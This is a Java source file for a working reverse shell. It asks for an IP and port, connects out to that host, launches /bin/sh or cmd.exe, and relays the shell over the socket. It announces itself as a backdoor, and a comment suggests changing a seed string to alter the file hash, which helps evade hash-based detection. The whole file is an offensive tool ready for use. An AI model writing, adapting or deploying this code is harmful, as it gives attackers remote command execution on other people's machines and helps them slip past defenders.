package apps.ReverseShell;


//Requires Java SE v8 or greater and JDK v8 or greater.
//Works on Linux OS, macOS, and Windows OS.


import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.util.Arrays;
import java.util.Scanner;

public class ReverseShellModified {
 
 // NOTE: Change seed to help you change the file hash.
 private String seed              = "3301Kira";
 private InetSocketAddress addr   = null;
 private String            os     = null;
 private String            shell  = null;
 private byte[]            buffer = null;
 private int               clen   = 0;
 private boolean           error  = false;
 
 public ReverseShellModified(String addr, int port) {
     this.addr = new InetSocketAddress(addr, port);
 }
 
 private boolean detect() {
     boolean detected = true;
     this.os = System.getProperty("os.name").toUpperCase();
     if (this.os.contains("LINUX") || this.os.contains("MAC")) {
         this.os    = "LINUX";
         this.shell = "/bin/sh";
     } else if (this.os.contains("WIN")) {
         this.os    = "WINDOWS";
         this.shell = "cmd.exe";
     } else {
         detected   = false;
         System.out.print("SYS_ERROR: Underlying operating system is not supported, program will now exit...\n");
     }
     return detected;
 }
 
 // strings in Java are immutable, so we need to avoid using them to minimize the data in memory
 private void brw(InputStream input, OutputStream output, String iname, String oname) {
     int bytes = 0;
     try {
         do {
             if (this.os.equals("WINDOWS") && iname.equals("STDOUT") && this.clen > 0) {
                 // for some reason Windows OS pipes STDIN into STDOUT
                 // we do not like that
                 // we need to discard the data from the stream
                 do {
                     bytes = input.read(this.buffer, 0, this.clen >= this.buffer.length ? this.buffer.length : this.clen);
                     this.clen -= this.clen >= this.buffer.length ? this.buffer.length : this.clen;
                 } while (bytes > 0 && this.clen > 0);
             } else {
                 bytes = input.read(this.buffer, 0, this.buffer.length);
                 if (bytes > 0) {
                     output.write(this.buffer, 0, bytes);
                     output.flush();
                     if (this.os.equals("WINDOWS") && oname.equals("STDIN")) {
                         this.clen += bytes;
                     }
                 } else if (iname.equals("SOCKET")) {
                     this.error = true;
                     System.out.print("SOC_ERROR: Shell connection has been terminated\n\n");
                 }
             }
         } while (input.available() > 0);
     } catch (SocketTimeoutException ex) {} catch (IOException ex) {
         this.error = true;
         System.out.print(String.format("STRM_ERROR: Cannot read from %s or write to %s, program will now exit...\n\n", iname, oname));
     }
 }
 
 public void run() {
     if (this.detect()) {
         Socket       client  = null;
         OutputStream socin   = null;
         InputStream  socout  = null;
         
         Process      process = null;
         OutputStream stdin   = null;
         InputStream  stdout  = null;
         InputStream  stderr  = null;
         
         try {
             client = new Socket();
             client.setSoTimeout(100);
             client.connect(this.addr);
             socin  = client.getOutputStream();
             socout = client.getInputStream();
             
             this.buffer = new byte[1024];
             
             process = new ProcessBuilder(this.shell).redirectInput(ProcessBuilder.Redirect.PIPE).redirectOutput(ProcessBuilder.Redirect.PIPE).redirectError(ProcessBuilder.Redirect.PIPE).start();
             stdin   = process.getOutputStream();
             stdout  = process.getInputStream();
             stderr  = process.getErrorStream();
             
             System.out.print("Backdoor is up and running...\n\n");
             do {
                 if (!process.isAlive()) {
                     System.out.print("PROC_ERROR: Shell process has been terminated\n\n"); break;
                 }
                 this.brw(socout, stdin, "SOCKET", "STDIN");
                 if (stderr.available() > 0) { this.brw(stderr, socin, "STDERR", "SOCKET"); }
                 if (stdout.available() > 0) { this.brw(stdout, socin, "STDOUT", "SOCKET"); }
             } while (!this.error);
             System.out.print("Backdoor will now exit...\n");
         } catch (IOException ex) {
             System.out.print(String.format("ERROR: %s\n", ex.getMessage()));
         } finally {
             if (stdin   != null) { try { stdin.close() ; } catch (IOException ex) {} }
             if (stdout  != null) { try { stdout.close(); } catch (IOException ex) {} }
             if (stderr  != null) { try { stderr.close(); } catch (IOException ex) {} }
             if (process != null) { process.destroy(); }
             
             if (socin  != null) { try { socin.close() ; } catch (IOException ex) {} }
             if (socout != null) { try { socout.close(); } catch (IOException ex) {} }
             if (client != null) { try { client.close(); } catch (IOException ex) {} }
             
             if (this.buffer != null) { Arrays.fill(this.buffer, (byte)0); }
         }
     }
 }
 
 public static int catchIntException(String x) {
		try {
			int y = Integer.parseInt(x);
			return y;
		} catch (Exception NumberFormatException) {
			System.out.println("You must input a number");
			int y = 999;
			return y;
		}
	}

static Scanner inputScanner = new Scanner(System.in);
 
 public static void main(String[] args) {

   
         System.out.print("Input port: ");
         String portNum = inputScanner.nextLine();
         int x = catchIntException(portNum);
         System.out.print("Input ip: ");
         String ip = inputScanner.nextLine();
         boolean error = false;
         int port = -1;
  
             try {
                 port = Integer.parseInt(portNum);
                 if (port < 0 || port > 65535) {
                     error = true;
                     System.out.print("Port number is out of range\n");
                 }
             } catch (NumberFormatException ex) {
                 error = true;
                 System.out.print("Port number is not valid\n");
             }
         
         if (!error) {
             ReverseShellModified sh = new ReverseShellModified(ip, port);
             sh.run();
             // don't forget to call the garbage cleaner
             sh = null;
             System.gc();
         }
     }
 }
 

